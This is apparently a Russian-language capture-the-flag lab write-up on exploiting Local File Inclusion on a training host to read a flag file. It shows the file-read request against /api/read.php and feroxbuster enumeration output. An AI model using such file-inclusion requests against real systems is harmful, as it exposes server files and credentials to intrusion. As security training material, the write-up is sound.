---
attack: lfi
---
Реализуйте LFI на узле [www.edu.stf](http://www.edu.stf) (10.124.1.235).  
Флаг лежит в файле /etc/pt.flag.

Думаю если вы не знаете про эту уязвимость стоит про нее прочитать...
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion

Заходим на сайт и  видим:
при запросе на страницу видим  ЭТо(или же данный запрос сам бывает проскакивает через некоторое время  ) (или же можно было просто найти js файл в консоли  разрабаботчика )
![[Pasted image 20240820181004.png]]
Меняем запрос на след запрос, как сказано в задании
`GET /api/read.php?file=/etc/pt.flag HTTP/1.1`


#### feroxbuster
```
200      GET      134l      222w     2144c http://www.edu.stf/style.css
200      GET       15l       45w      477c http://www.edu.stf/assets/getLoad.js
200      GET        3l       40w      312c http://www.edu.stf/assets/arrow-right.svg
200      GET      193l     1057w    94180c http://www.edu.stf/assets/pubtrans.png
200      GET      142l      924w    82615c http://www.edu.stf/assets/ship.png
200      GET      161l     1009w    82923c http://www.edu.stf/assets/plane.png
200      GET      449l     2278w   179214c http://www.edu.stf/assets/train.png
301      GET        7l       20w      231c http://www.edu.stf/api => http://www.edu.stf/api/
301      GET        7l       20w      234c http://www.edu.stf/assets => http://www.edu.stf/assets/
200      GET       83l      190w     2972c http://www.edu.stf/
200      GET       70l       93w     2148c http://www.edu.stf/config
[####################] - 9s     61421/61421   0s      found:11      errors:0      
[####################] - 8s     20469/20469   2616/s  http://www.edu.stf/ 
[####################] - 7s     20469/20469   2789/s  http://www.edu.stf/api/ 
[####################] - 7s     20469/20469   2794/s  http://www.edu.stf/assets/ 
```
[[web-2-2]]